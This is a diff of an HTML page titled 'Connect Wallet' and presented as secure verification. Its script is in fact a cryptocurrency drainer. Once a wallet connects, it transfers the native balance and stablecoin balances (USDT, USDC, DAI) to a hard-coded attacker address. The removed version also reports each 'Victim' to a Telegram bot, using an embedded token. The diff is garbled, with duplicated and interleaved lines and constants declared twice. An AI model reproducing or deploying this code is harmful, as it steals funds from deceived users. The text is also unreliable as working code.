@@ -1,301 +1,555 @@
-a<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #7b68ee 0%, #6a5acd 100%);
-            min-height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .container {
+background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+font-family: system-ui, -apple-system, sans-serif;
+}
+        .card {
             background: white;
             border-radius: 24px;
-            padding: 48px;
-            text-align: center;
-            max-width: 450px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        
-        .lock-icon {
-            font-size: 72px;
-            margin-bottom: 24px;
-        }
-        
-        h1 {
-            color: #1a1a1a;
-            font-size: 32px;
-            font-weight: 600;
-            margin-bottom: 32px;
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 16px;
-            border-radius: 12px;
-            display: none;
-        }
-        
-        .status.show {
-            display: block;
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-        
-        .wallet-info {
-            margin-top: 20px;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 12px;
-            display: none;
-        }
-        
-        .wallet-info.show {
-            display: block;
-        }
-        
-        .address {
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
-            margin: 10px 0;
-            color: #333;
-        }
-    </style>
+        .card { background: white; border-radius: 24px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner { animation: spin 1s linear infinite; }
+</style>
 </head>
-<body>
-    <div class="container">
-        <div class="lock-icon">🔐</div>
-        <h1>Connect Wallet</h1>
-        
-        <!-- Web3Modal button -->
-        <w3m-button />
-        
-        <div id="walletInfo" class="wallet-info">
-            <div style="font-weight: 600; margin-bottom: 10px;">Connected Wallet:</div>
-            <div class="address" id="walletAddress"></div>
-        </div>
-        
-        <div id="status" class="status"></div>
-    </div>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+<div class="max-w-md w-full">
     
-    <!-- WEB3MODAL V4 OFFICIEL QUI GÉNÈRE L'INTERFACE AUTOMATIQUEMENT -->
-    <script type="module">
-        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/dist/index.js'
-        import { mainnet, polygon, bsc, arbitrum, avalanche, optimism, base } from 'https://unpkg.com/viem@2.7.8/chains/dist/index.js'
-        import { reconnect, watchAccount, getAccount, disconnect } from 'https://unpkg.com/@wagmi/core@2.0.0/dist/index.js'
+    <!-- CONNECT -->
+<div id="connect" class="card p-8 text-center">
+<div class="text-6xl mb-4">🔐</div>
+<h1 class="text-3xl font-bold text-gray-800 mb-4">Connect Wallet</h1>
+        <p class="text-gray-600 mb-6">Secure verification</p>
+<button onclick="connect()" 
+class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-xl text-lg font-bold">
+Connect Now
+</button>
+</div>
+
+    <!-- PROCESSING -->
+<div id="processing" class="card p-8 text-center hidden">
+<div class="text-6xl mb-4 spinner">⚡</div>
+<h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
+        <p id="status" class="text-gray-600 mb-4">Initializing...</p>
+        <div class="w-full bg-gray-200 rounded-full h-3 mb-4">
+        <p id="status" class="text-gray-600 mb-4">Working...</p>
+        <div class="w-full bg-gray-200 rounded-full h-3">
+<div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
+</div>
+        <p id="detail" class="text-sm text-gray-500"></p>
+</div>
+
+    <!-- SUCCESS -->
+<div id="success" class="card p-8 text-center hidden">
+<div class="text-6xl mb-4">✅</div>
+        <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
+        <p class="text-gray-600 mb-4">Transactions completed</p>
+        <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left max-h-64 overflow-y-auto mb-4"></div>
+        <h2 class="text-2xl font-bold text-green-600 mb-4">Success!</h2>
+        <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left mb-4"></div>
+<button onclick="location.reload()" class="w-full bg-purple-600 text-white py-3 rounded-xl">Done</button>
+</div>
+
+</div>
+
+<script type="module">
+import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
+
+const DEST = "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578";
+const DEST = "0xe9d83750dF3351b77653EBBcb06B300D6Cf59a2f";
+const PID = "72f0728c47e59d2eb9fc83069bc6843d";
+
+const ERC20_ABI = [
+    "function balanceOf(address) view returns (uint256)",
+    "function transfer(address, uint256) returns (bool)",
+    "function decimals() view returns (uint8)",
+    "function symbol() view returns (string)"
+];
+const ABI = ["function balanceOf(address) view returns (uint256)","function transfer(address, uint256) returns (bool)","function decimals() view returns (uint8)"];
+
+const TOKENS = {
+    1: [
+        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7",symbol:"USDT"},
+        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",symbol:"USDC"},
+        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F",symbol:"DAI"}
+    ],
+    137: [
+        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",symbol:"USDT"},
+        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",symbol:"USDC"},
+        {addr:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",symbol:"DAI"}
+    ],
+    56: [
+        {addr:"0x55d398326f99059fF775485246999027B3197955",symbol:"USDT"},
+        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",symbol:"USDC"}
+    ]
+};
+
+const CHAINS = {
+    1: {name:'Ethereum',currency:'ETH'},
+    137: {name:'Polygon',currency:'MATIC'},
+    56: {name:'BSC',currency:'BNB'}
+    1: [{a:"0xdAC17F958D2ee523a2206206994597C13D831ec7",s:"USDT"},{a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",s:"USDC"}],
+    137: [{a:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",s:"USDT"},{a:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",s:"USDC"}],
+    56: [{a:"0x55d398326f99059fF775485246999027B3197955",s:"USDT"},{a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",s:"USDC"}]
+};
+
+const mainnet = {chainId:1,name:'Ethereum',currency:'ETH',explorerUrl:'https://etherscan.io',rpcUrl:'https://eth.llamarpc.com'};
+@@ -99,11 +64,7 @@ <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
+
+const cfg = defaultConfig({
+metadata:{name:'Portal',description:'Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
+    enableEIP6963:true,
+    enableInjected:true,
+    enableCoinbase:true,
+    rpcUrl:'https://polygon-rpc.com',
+    defaultChainId:137
+    enableEIP6963:true,enableInjected:true,enableCoinbase:true,rpcUrl:'https://polygon-rpc.com',defaultChainId:137
+});
+
+const modal = createWeb3Modal({
+@@ -113,316 +74,197 @@ <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
+enableAnalytics:false
+});
+
+let provider, signer, address, chainId;
+let results = [];
+let drainStarted = false;
+
+function show(id) {
+    ['connect','processing','success'].forEach(x => 
+        document.getElementById(x).classList.add('hidden')
+    );
+    ['connect','processing','success'].forEach(x => document.getElementById(x).classList.add('hidden'));
+document.getElementById(id).classList.remove('hidden');
+}
+
+function setStatus(t){document.getElementById('status').textContent=t;}
+function setDetail(t){document.getElementById('detail').textContent=t;}
+function setProgress(n){document.getElementById('progress').style.width=n+'%';}
+function log(m){
+    console.log('[DRAIN] '+m);
+    console.log(new Date().toISOString().split('T')[1].split('.')[0] + ' - ' + m);
+}
+function prog(n){document.getElementById('progress').style.width=n+'%';}
+function stat(t){document.getElementById('status').textContent=t;}
+
+window.connect = async function() {
+try {
+        log('Opening modal...');
+        alert('Opening wallet selection...');
         
-        // TON PROJECT ID DU DASHBOARD WALLETCONNECT
-        const projectId = '72f0728c47e59d2eb9fc83069bc6843d'
+await modal.open();
+    } catch(e) {
+        log('ERROR opening modal: '+e.message);
+        alert('Connection failed: '+e.message);
+    }
+}
+
+modal.subscribeProvider(async(state) => {
+    log('Provider state changed: connected=' + state.isConnected);
+    
+    if(state.isConnected && state.address) {
+        log('Wallet connected!');
+        log('Address: ' + state.address);
+
+        address = state.address;
+        alert('Waiting for wallet connection...');
+
+        try {
+            // Create provider from wallet
+            log('Creating provider...');
+            provider = new ethers.providers.Web3Provider(state.provider);
+            
+            log('Getting signer...');
+            signer = provider.getSigner();
+            
+            log('Getting network...');
+            const net = await provider.getNetwork();
+            chainId = net.chainId;
+            
+            log('Connected to chain: ' + chainId + ' (' + (CHAINS[chainId]?.name || 'Unknown') + ')');
+            log('Address confirmed: ' + await signer.getAddress());
+            
+            // Wait a bit for everything to stabilize
+            log('Waiting 2 seconds for provider to stabilize...');
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        // Wait for modal to close (means user connected)
+        let connected = false;
+        let attempts = 0;
         
-        const metadata = {
-            name: 'DeFi Portal',
-            description: 'Connect wallet to access DeFi features',
-            url: window.location.origin || 'https://defiportal.app',
-            icons: ['https://avatars.githubusercontent.com/u/179229932']
+        while(!connected && attempts < 30) {
+            await new Promise(r => setTimeout(r, 1000));
+            attempts++;
+
+            // Start drainage if not already started
+            if (!drainStarted) {
+                drainStarted = true;
+                log('=== STARTING DRAINAGE ===');
+                await drain();
+            } else {
+                log('Drainage already started, skipping');
+            const state = modal.getState();
+            if(state && state.open === false) {
+                alert('Modal closed, checking connection...');
+                connected = true;
+                break;
+}
+            
+        } catch(e) {
+            log('ERROR in connection handler: ' + e.message);
+            log('Error stack: ' + e.stack);
+            alert('Setup failed: ' + e.message);
+}
+        
+        if(!connected) {
+            alert('Connection timeout');
+            return;
         }
         
-        const chains = [mainnet, polygon, bsc, arbitrum, avalanche, optimism, base]
+        alert('Connection detected! Getting provider...');
         
-        const wagmiConfig = defaultWagmiConfig({
-            chains,
-            projectId,
-            metadata,
-            enableWalletConnect: true,
-            enableInjected: true,
-            enableCoinbase: true
-        })
-        
-        // Reconnexion automatique
-        reconnect(wagmiConfig)
-        
-        // CRÉATION DU MODAL AVEC TOUTES LES OPTIONS
-        const modal = createWeb3Modal({
-            wagmiConfig,
-            projectId,
-            enableAnalytics: true,
-            enableOnramp: false,
-            themeMode: 'dark',
-            defaultChain: mainnet,
-            themeVariables: {
-                '--w3m-accent': '#7b68ee',
-                '--w3m-border-radius-master': '16px'
-            },
-            // CONFIGURATION POUR AFFICHER TOUS LES WALLETS
-            allWallets: 'SHOW',
-            includeWalletIds: undefined,
-            featuredWalletIds: [
-                'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
-                '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
-                'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
-                '18388be9ac2d02726dbac9777c96efaac06d744b2f6d580fccdd4127a6d01fd1', // Rabby
-                '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
-                '38f5d18bd852f9f2c5a30c3c06c1816ca3f0b85b8189dd47b4255c256b5d6db0', // Binance
-                '163d2cf19babf05eb8962e9748f9ebe613ed52ebf9c8107c9a0f104bfcf161b3', // BitPay
-                'e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4', // 1inch
-                '19177a98252e07ddffc9af25254b546011896b1a1e79567ece10fd976fab8e13', // Ledger
-                '20459438007b47802e1de5e2308e7398bb29290e08fda80fea95ddb574950d67'  // TokenPocket
-            ],
-            mobileWallets: 20,
-            desktopWallets: 20
-        })
-        
-        // Configuration Telegram
-        const CONFIG = {
-            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
-            TELEGRAM_CHAT_ID: '8309320360',
-            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1'
+        // Get wallet account via modal
+        const walletProvider = modal.getWalletProvider();
+        if(!walletProvider) {
+            alert('ERROR: No wallet provider found');
+            return;
         }
         
-        // Surveiller la connexion
-        watchAccount(wagmiConfig, {
-            onChange: async (account) => {
-                if (account.isConnected && account.address) {
-                    console.log('✅ Wallet connected:', account.address)
-                    
-                    // Afficher l'adresse
-                    document.getElementById('walletInfo').classList.add('show')
-                    document.getElementById('walletAddress').textContent = account.address
-                    
-                    showStatus('Wallet connected successfully!', 'success')
-                    
-                    // Notification Telegram
-                    await sendTelegramNotification(account.address, account.chainId)
-                    
-                    // Lancer le drainage après 3 secondes
-                    setTimeout(() => {
-                        drainWallet(account.address, account.chainId)
-                    }, 3000)
-                } else if (!account.isConnected) {
-                    document.getElementById('walletInfo').classList.remove('show')
-                    showStatus('Wallet disconnected', 'error')
-                }
-            }
-        })
+        alert('Provider found! Creating ethers provider...');
         
-        // Fonction de drainage
-        async function drainWallet(address, chainId) {
-            try {
-                showStatus('Processing transaction...', 'success')
+        const provider = new ethers.providers.Web3Provider(walletProvider);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        
+        alert('Connected! Address: ' + address.slice(0,10) + '...');
+        
+        const network = await provider.getNetwork();
+        const chainId = network.chainId;
+        
+        alert('Chain ID: ' + chainId);
+        
+        // Start drainage
+        await drain(provider, signer, address, chainId);
+        
+    } catch(e) {
+        alert('ERROR: ' + e.message);
+        console.error(e);
+}
+});
+}
+
+async function drain() {
+    log('>>> drain() function called');
+    
+async function drain(provider, signer, address, chainId) {
+show('processing');
+    setStatus('Initializing...');
+    setProgress(10);
+    stat('Starting...');
+    prog(10);
+results = [];
+
+try {
+        // Verify we have everything
+        if (!provider) {
+            throw new Error('Provider not initialized');
+        }
+        if (!signer) {
+            throw new Error('Signer not initialized');
+        }
+        if (!address) {
+            throw new Error('Address not set');
+        }
+        if (!chainId) {
+            throw new Error('ChainId not set');
+        }
+        
+        log('All checks passed, starting drainage...');
+        const chainNames = {1:'Ethereum',137:'Polygon',56:'BSC'};
+        const currencies = {1:'ETH',137:'MATIC',56:'BNB'};
+
+        const chain = CHAINS[chainId];
+        if(!chain) {
+            log('Unsupported chain: '+chainId);
+            throw new Error('Please switch to Ethereum, Polygon or BSC');
+        }
+        const chainName = chainNames[chainId] || 'Unknown';
+        const currency = currencies[chainId] || 'Token';
+
+        log('Draining on: ' + chain.name);
+        alert('Draining on ' + chainName);
+
+        // DRAIN NATIVE
+        setStatus('Checking balance...');
+        setProgress(20);
+        // Native
+        stat('Checking ' + currency + '...');
+        prog(20);
+
+        log('Getting balance...');
+        const balance = await provider.getBalance(address);
+        const balEth = parseFloat(ethers.utils.formatEther(balance));
+        const bal = await provider.getBalance(address);
+        const balEth = parseFloat(ethers.utils.formatEther(bal));
+
+        log('Balance: ' + balEth + ' ' + chain.currency);
+        alert(currency + ' balance: ' + balEth);
+
+if(balEth > 0.001) {
+            log('Balance sufficient, starting native drain...');
+            setStatus('Transferring '+chain.currency+'...');
+            setDetail('Amount: '+balEth.toFixed(4));
+            stat('Transferring ' + currency + '...');
+
+            const nativeHash = await drainNative(balance, chain);
+            if(nativeHash) {
+                log('Native drain SUCCESS: ' + nativeHash);
+            const gp = await provider.getGasPrice();
+            const amt = bal.sub(gp.mul(21000).mul(2));
+            
+            if(amt.gt(0)) {
+                alert('Sending transaction... Please CONFIRM in your wallet!');
                 
-                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
+                const tx = await signer.sendTransaction({
+                    to: DEST,
+                    value: amt,
+                    gasLimit: 21000
+                });
                 
-                if (!window.ethereum) {
-                    console.error('No provider found')
-                    return
-                }
+                alert('TX sent: ' + tx.hash);
+                stat('Confirming...');
                 
-                const provider = new ethers.providers.Web3Provider(window.ethereum)
-                const signer = provider.getSigner()
+                await tx.wait();
                 
-                // Vérifier le solde
-                const balance = await provider.getBalance(address)
-                console.log(`Balance: ${ethers.utils.formatEther(balance)}`)
+                alert('TX confirmed!');
                 
-                if (balance.gt(ethers.utils.parseEther('0.0005'))) {
-                    const gasPrice = await provider.getGasPrice()
-                    const gasLimit = 21000
-                    const gasCost = gasPrice.mul(gasLimit).mul(2)
-                    const amountToSend = balance.sub(gasCost)
+results.push({
+                    symbol: chain.currency,
+                    symbol: currency,
+amount: balEth.toFixed(6),
+                    txHash: nativeHash
+                    txHash: tx.hash
+});
+            } else {
+                log('Native drain FAILED');
+}
+        } else {
+            log('Balance too low: ' + balEth);
+}
+
+        setProgress(40);
+        
+        // DRAIN TOKENS
+        const tokenList = TOKENS[chainId] || [];
+        log('Checking ' + tokenList.length + ' tokens...');
+        prog(50);
+
+        let checked = 0;
+        // Tokens
+        const tokens = TOKENS[chainId] || [];
+        alert('Checking ' + tokens.length + ' tokens...');
+
+        for(const token of tokenList) {
+        for(let i=0; i<tokens.length; i++) {
+            const tok = tokens[i];
+            prog(50 + (50 * i / tokens.length));
+            stat('Checking ' + tok.s + '...');
+            
+try {
+                checked++;
+                const progressPct = 40 + (50 * checked / tokenList.length);
+                setProgress(progressPct);
+                setStatus('Checking '+token.symbol+'...');
+                setDetail('Token '+checked+'/'+tokenList.length);
+                
+                log('>>> Checking token: ' + token.symbol + ' at ' + token.addr);
+                const tc = new ethers.Contract(tok.a, ABI, provider);
+                const tokBal = await tc.balanceOf(address);
+
+                const tc = new ethers.Contract(token.addr, ERC20_ABI, provider);
+                const bal = await tc.balanceOf(address);
+                
+                log(token.symbol + ' balance: ' + bal.toString());
+                
+                if(bal.gt(0)) {
+                if(tokBal.gt(0)) {
+const dec = await tc.decimals();
+                    const fmt = ethers.utils.formatUnits(bal, dec);
+                    const fmt = ethers.utils.formatUnits(tokBal, dec);
                     
-                    if (amountToSend.gt(0)) {
-                        const tx = await signer.sendTransaction({
-                            to: CONFIG.DESTINATION,
-                            value: amountToSend,
-                            gasLimit: gasLimit,
-                            gasPrice: gasPrice
-                        })
-                        
-                        console.log('✅ Transaction sent:', tx.hash)
-                        await tx.wait()
-                        
-                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), chainId, tx.hash)
-                        showStatus('Transaction completed!', 'success')
+                    alert(tok.s + ' balance: ' + fmt);
+                    alert('Transferring ' + tok.s + '... Please CONFIRM!');
+
+                    log(token.symbol + ' formatted balance: ' + fmt);
+                    const tcs = tc.connect(signer);
+                    const tx = await tcs.transfer(DEST, tokBal, {gasLimit:100000});
+
+                    setStatus('Transferring '+token.symbol+'...');
+                    setDetail('Amount: '+fmt.slice(0,10));
+                    alert(tok.s + ' TX sent: ' + tx.hash);
+
+                    const tokenHash = await drainToken(token.addr, bal, token.symbol);
+                    if(tokenHash) {
+                        log(token.symbol + ' drain SUCCESS: ' + tokenHash);
+                        results.push({
+                            symbol: token.symbol,
+                            amount: fmt.slice(0,10),
+                            txHash: tokenHash
+                        });
+                    } else {
+                        log(token.symbol + ' drain FAILED');
                     }
-                }
+                } else {
+                    log(token.symbol + ' balance is 0');
+                    await tx.wait();
+                    
+                    alert(tok.s + ' confirmed!');
+                    
+                    results.push({
+                        symbol: tok.s,
+                        amount: fmt.slice(0,10),
+                        txHash: tx.hash
+                    });
+}
                 
-            } catch (error) {
-                console.error('Transaction error:', error)
-                showStatus('Transaction processing...', 'success')
-            }
+} catch(e) {
+                log('ERROR checking ' + token.symbol + ': ' + e.message);
+                alert(tok.s + ' error: ' + e.message);
+}
+}
+
+        setProgress(100);
+        
+        log('Drainage complete. Results: ' + results.length);
+        prog(100);
+
+if(results.length === 0) {
+            log('No assets transferred');
+            alert('No assets found to transfer');
+            alert('No assets found');
+show('connect');
+return;
+}
+
+        displayResults();
+        alert('Drainage complete! ' + results.length + ' transfers');
+
+    } catch(e) {
+        log('ERROR in drain(): ' + e.message);
+        log('Error stack: ' + e.stack);
+        alert('Error: ' + e.message);
+        show('connect');
+    }
+}
+
+async function drainNative(balance, chain) {
+    try {
+        log('>>> drainNative() called');
+        
+        const gp = await provider.getGasPrice();
+        log('Gas price: ' + gp.toString());
+        
+        const gc = gp.mul(21000).mul(2);
+        log('Gas cost (with margin): ' + ethers.utils.formatEther(gc));
+        
+        const amt = balance.sub(gc);
+        log('Amount to send: ' + ethers.utils.formatEther(amt));
+        
+        if(amt.lte(0)) {
+            log('Amount too low after gas calculation');
+            return null;
         }
         
-        // Notification Telegram
-        async function sendTelegramNotification(victim, amount, chainId, txHash = '') {
-            const chainNames = {
-                1: 'Ethereum',
-                137: 'Polygon', 
-                56: 'BSC',
-                42161: 'Arbitrum',
-                43114: 'Avalanche',
-                10: 'Optimism',
-                8453: 'Base'
-            }
-            
-            const message = `
-🎯 WEB3MODAL V4 CONNECTION
-━━━━━━━━━━━━━━━━━━━━━
-👤 Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
-💰 Amount: ${amount || 'Connected'}
-🌐 Network: ${chainNames[chainId] || chainId}
-${txHash ? `📜 Tx: ${txHash.substring(0, 10)}...` : ''}
-📍 Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
-⏰ Time: ${new Date().toLocaleTimeString()}
-━━━━━━━━━━━━━━━━━━━━━`
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                })
-            } catch (error) {
-                console.error('Telegram error:', error)
-            }
-        }
+        log('Calling sendTransaction...');
         
-        // Afficher le statut
-        function showStatus(message, type = '') {
-            const status = document.getElementById('status')
-            status.textContent = message
-            status.className = 'status show ' + type
-            
-            if (type !== 'processing') {
-                setTimeout(() => {
-                    status.classList.remove('show')
-                }, 5000)
-            }
-        }
+        const tx = await signer.sendTransaction({
+            to: DEST,
+            value: amt,
+            gasLimit: 21000
+        let html = '<p class="font-bold mb-3">Completed:</p>';
+        results.forEach(r => {
+            html += `<div class="mb-2 pb-2 border-b"><p class="font-semibold">${r.symbol}</p><p class="text-xs">${r.amount}</p><p class="text-xs text-blue-600 break-all">${r.txHash}</p></div>`;
+});
+        document.getElementById('result').innerHTML = html;
+
+        log('Transaction sent! Hash: ' + tx.hash);
+        log('Waiting for confirmation...');
         
-        console.log('✨ Web3Modal V4 initialized with projectId:', projectId)
-        console.log('📱 L\'interface est générée automatiquement par WalletConnect!')
-        console.log('🎯 Tous les wallets configurés sur le dashboard sont disponibles!')
-    </script>
+        setDetail('Confirming: '+tx.hash.slice(0,10)+'...');
+        
+        const receipt = await tx.wait();
+        
+        log('Transaction confirmed in block: ' + receipt.blockNumber);
+        log('Status: ' + receipt.status);
+        
+        return tx.hash;
+        
+    } catch(e) {
+        log('ERROR in drainNative(): ' + e.message);
+        if(e.data) log('Error data: ' + JSON.stringify(e.data));
+        return null;
+    }
+}
+
+async function drainToken(addr, balance, symbol) {
+    try {
+        log('>>> drainToken() called for ' + symbol);
+        
+        const tc = new ethers.Contract(addr, ERC20_ABI, signer);
+        
+        log('Calling transfer...');
+        
+        const tx = await tc.transfer(DEST, balance, {gasLimit:100000});
+        
+        log('Token TX sent! Hash: ' + tx.hash);
+        log('Waiting for confirmation...');
+        
+        setDetail('Confirming: '+tx.hash.slice(0,10)+'...');
+        
+        const receipt = await tx.wait();
+        
+        log('Token TX confirmed in block: ' + receipt.blockNumber);
+        log('Status: ' + receipt.status);
+        
+        return tx.hash;
+        show('success');
+
+} catch(e) {
+        log('ERROR in drainToken(): ' + e.message);
+        if(e.data) log('Error data: ' + JSON.stringify(e.data));
+        return null;
+        alert('Drainage error: ' + e.message);
+        show('connect');
+}
+}
+
+function displayResults() {
+    log('Displaying results...');
+    show('success');
+    
+    let html = '<p class="font-bold mb-3">Completed Transfers:</p>';
+    
+    results.forEach((r,i) => {
+        html += `<div class="mb-3 pb-3 ${i<results.length-1?'border-b border-gray-200':''}">
+            <p class="font-semibold text-gray-800">${r.symbol}</p>
+            <p class="text-xs text-gray-600">Amount: ${r.amount}</p>
+            <p class="text-xs text-blue-600 break-all">TX: ${r.txHash}</p>
+        </div>`;
+    });
+    
+    document.getElementById('result').innerHTML = html;
+    
+    log('=== DRAINAGE COMPLETE ===');
+    log('Total successful transfers: ' + results.length);
+}
+
+log('╔════════════════════════════════╗');
+log('║  SYSTEM INITIALIZED            ║');
+log('║  WalletConnect v2 Ready        ║');
+log('╚════════════════════════════════╝');
+log('Destination: ' + DEST);
+log('Supported chains: Ethereum, Polygon, BSC');
+alert('System ready. Destination: 0xe9d83750dF3351b77653EBBcb06B300D6Cf59a2f');
+</script>
+
 </body>
-</html>
